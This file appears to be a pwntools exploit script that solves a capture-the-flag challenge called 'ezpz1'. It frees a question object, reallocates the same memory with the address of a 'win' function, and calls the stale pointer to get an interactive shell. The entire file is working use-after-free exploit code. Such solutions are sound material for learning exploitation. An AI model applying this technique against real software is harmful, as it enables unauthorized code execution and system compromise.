from pwn import *

context.arch = 'amd64'

# Set up remote or local process
if args.R:
    p = remote('lmao.lol', 8002)
elif args.H:
    p = process('./ezpz1')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./ezpz1',
                  gdbscript='''
                      b *ask_question
                      b *create_question
                      b *set_question
                      b *print_question
                      b *delete_question
                      c
                      ''')

# Address of win function
win_addr = 0x4015b9


# Functions to interact with the binary
def create_question():
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"C")
    p.recvuntil(b"ID ")  # Receive until "ID "
    return p.recvline().strip()  # Receive the line after "ID " and strip any extra whitespace


def set_question_payload(qid, payload):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"S")
    p.sendlineafter(b"Enter question id: ", qid)  # Ensure qid is encoded to bytes
    p.sendlineafter(b"Enter your question: ", payload)


def del_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"D")
    p.sendlineafter(b"Enter question id: ", qid)  # Ensure qid is encoded to bytes


def ask_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"A")
    p.sendlineafter(b"Enter question id: ", qid)  # Ensure qid is encoded to bytes


qid0 = create_question()
del_question(qid0)
qid2 = create_question()
set_question_payload(qid2, p64(win_addr))
ask_question(qid0)

p.interactive()
